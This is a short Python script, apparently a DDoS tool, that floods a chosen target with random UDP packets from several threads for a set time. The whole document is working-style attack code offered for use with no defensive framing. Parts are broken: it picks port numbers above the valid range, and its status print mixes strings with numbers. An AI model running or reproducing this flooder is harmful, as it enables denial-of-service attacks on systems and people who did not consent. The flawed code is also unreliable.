import socket
import time
import random
import threading
import sys

try:
    Target, Threads, Timer = str(sys.argv[1]), int(sys.argv[2]), float(sys.argv[3])
except IndexError:
    print('\n[+] Usage: python3 ddos-tool.py' + sys.argv[0] + '<Target> <Threads> <Timer>')

Timeout = time.time() + 1 * Timer

def attack():
    try:
        Bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < Timeout:
            dport = random.randint(22,555000)
            sock.sendto(Bytes*random.randint(5,22),(Target,dport))
        return
    except Exception as Error:
        print(Error)
print('\n[+] Starting DDoS-Attack ...')
print('\n Target : ' + Target + '\n Threads : ' + Threads + '\n Time : ' + Timer)

for _ in range(0, Threads):
    threading.Thread(target=attack).start()